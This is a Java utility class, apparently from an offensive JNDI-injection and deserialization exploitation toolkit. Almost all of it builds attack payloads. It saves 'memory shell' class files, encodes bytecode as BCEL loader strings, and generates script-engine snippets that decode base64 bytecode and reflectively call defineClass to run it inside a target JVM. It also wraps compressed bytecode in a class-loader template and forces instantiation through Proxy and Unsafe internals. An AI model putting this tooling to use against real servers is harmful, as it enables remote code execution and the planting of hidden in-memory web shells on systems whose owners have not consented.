package com.qi4l.jndi.gadgets.utils;

import com.sun.org.apache.bcel.internal.classfile.Utility;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang.StringUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.zip.GZIPOutputStream;

import static com.qi4l.jndi.gadgets.Config.Config.*;
import static com.qi4l.jndi.gadgets.utils.handle.ClassMethodHandler.insertMethod;
import static com.qi4l.jndi.gadgets.utils.handle.ClassNameHandler.generateClassName;
import static com.qi4l.jndi.gadgets.utils.handle.GlassHandler.shrinkBytes;

public class Utils {

    public static Class makeClass(String clazzName) {
        ClassPool classPool = ClassPool.getDefault();
        CtClass   ctClass   = classPool.makeClass(clazzName);
        Class     clazz     = null;
        try {
            clazz = ctClass.toClass();
        } catch (CannotCompileException e) {
            throw new RuntimeException(e);
        }
        ctClass.defrost();
        return clazz;
    }

    public static String[] handlerCommand(String command) {
        String info  = command.split("[-]")[1];
        int    index = info.indexOf("#");
        String par1  = info.substring(0, index);
        String par2  = info.substring(index + 1);
        return new String[]{par1, par2};
    }


    public static String base64Decode(String bs) throws Exception {
        Class  base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception ignored) {
            }
        }

        return new String(value);
    }

    public static void saveCtClassToFile(CtClass ctClass) throws Exception {
        // 总体在进行类字节码的缩短
        shrinkBytes(ctClass);
        byte[] classBytes = ctClass.toBytecode();

        // 保存内存马文件
        if (GEN_MEM_SHELL) {
            if (StringUtils.isNotEmpty(GEN_MEM_SHELL_FILENAME)) {
                writeClassToFile(GEN_MEM_SHELL_FILENAME, classBytes);
            } else {
                writeClassToFile(ctClass.getName(), classBytes);
            }
        }
    }

    public static void loadClassTest(byte[] classBytes, String className) throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method      method      = Proxy.class.getDeclaredMethod("defineClass0", ClassLoader.class, String.class, byte[].class, int.class, int.class);
        method.setAccessible(true);
        Class clazz = (Class) method.invoke(null, classLoader, className, classBytes, 0, classBytes.length);

        try {
            clazz.newInstance();
        } catch (Exception ignored) {
            Class unsafe         = Class.forName("sun.misc.Unsafe");
            Field theUnsafeField = unsafe.getDeclaredField("theUnsafe");
            theUnsafeField.setAccessible(true);
            Object unsafeObject = theUnsafeField.get(null);
            unsafeObject.getClass().getDeclaredMethod("allocateInstance", Class.class).invoke(unsafeObject, clazz);
        }
    }

    public static String generateBCELFormClassBytes(byte[] bytes) throws Exception {
        return "$$BCEL$$" + Utility.encode(bytes, true);
    }

    public static String getJSEngineValue(byte[] classBytes) throws Exception {
        if (USING_RHINO) {
            return "new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"" + generateBCELFormClassBytes(classBytes) + "\").newInstance();";
        } else {
            return "var data = \"" + base64Encode(classBytes) + "\";var dataBytes=java.util.Base64.getDecoder().decode(data);var cloader= java.lang.Thread.currentThread().getContextClassLoader();var superLoader=cloader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();var method=superLoader.getDeclaredMethod(\"defineClass\",dataBytes.getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);method.setAccessible(true);var memClass=method.invoke(cloader,dataBytes,0,dataBytes.length);memClass.newInstance();";
        }
    }

    public static CtClass encapsulationByClassLoaderTemplate(byte[] bytes) throws Exception {
        CtClass ctClass = POOL.get("com.qi4l.jndi.template.ClassLoaderTemplate");
        ctClass.setName(generateClassName());
        ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
        GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
        gzipOutputStream.write(bytes);
        gzipOutputStream.close();

        String b64 = Base64.encodeBase64String(outBuf.toByteArray());
        // 如果 b64 的长度比较大，则将其切分为多个字符串进行拼接，避免单个字符串过长
        String code = "";
        if (b64.length() > 60000) {
            String[] arrays = splitString(b64, 60000);
            for (int i = 0; i < arrays.length; i++) {
                if (i == 0) {
                    code += "b64=\"" + arrays[0] + "\";\n";
                } else {
                    code += "b64 +=\"" + arrays[i] + "\";\n";
                }
            }
        } else {
            code += "b64=\"" + b64 + "\";\n";
        }

        // 将赋值的代码插入到 ClassLoaderTemplate 中
        insertMethod(ctClass, "initClassBytes", code);
        return ctClass;
    }

    public static void writeClassToFile(String fileName, byte[] classBytes) throws Exception {
        File file      = new File(fileName.replace(".", File.separator) + ".class");
        File parentDir = file.getParentFile();
        if (!parentDir.exists()) {
            if (!parentDir.mkdirs()) {
                // 创建文件夹失败
                return;
            }
        }
        FileOutputStream fileOutputStream = new FileOutputStream(file);
        fileOutputStream.write(classBytes);
        fileOutputStream.flush();
        fileOutputStream.close();
    }

    public static String[] splitString(String str, int chunkSize) {
        if (str == null || str.isEmpty() || chunkSize <= 0) {
            return null;
        }
        int      len      = str.length();
        int      arrayLen = (len + chunkSize - 1) / chunkSize;
        String[] result   = new String[arrayLen];
        int      k        = 0;
        for (int i = 0; i < len; i += chunkSize) {
            int endIndex = Math.min(i + chunkSize, len);
            result[k++] = str.substring(i, endIndex);
        }
        return result;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class  base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", new Class[]{}).invoke(null, (Object[]) null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }


}
